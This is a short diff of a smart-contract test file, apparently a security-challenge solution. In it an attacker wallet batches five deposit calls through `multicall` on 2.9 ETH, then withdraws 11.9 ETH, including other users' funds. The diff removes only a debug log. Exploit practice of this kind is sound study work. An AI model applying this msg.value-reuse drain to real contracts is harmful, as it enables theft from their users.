@@ -44,10 +44,7 @@ describe(NAME, function () {
                 .multicall([depositCallData, depositCallData, depositCallData, depositCallData, depositCallData], {
                     value: ethers.utils.parseEther("2.9"),
                 });
-            const balanace_in_contract = await multiDelegateCall
-                .connect(attackerWallet)
-                .balances(attackerWallet.address);
-            console.log("balanace_in_contract", balanace_in_contract);
+
             // give me back my eth + eth of other users
             multiDelegateCall.connect(attackerWallet).withdraw(ethers.utils.parseEther("11.9"));
         });
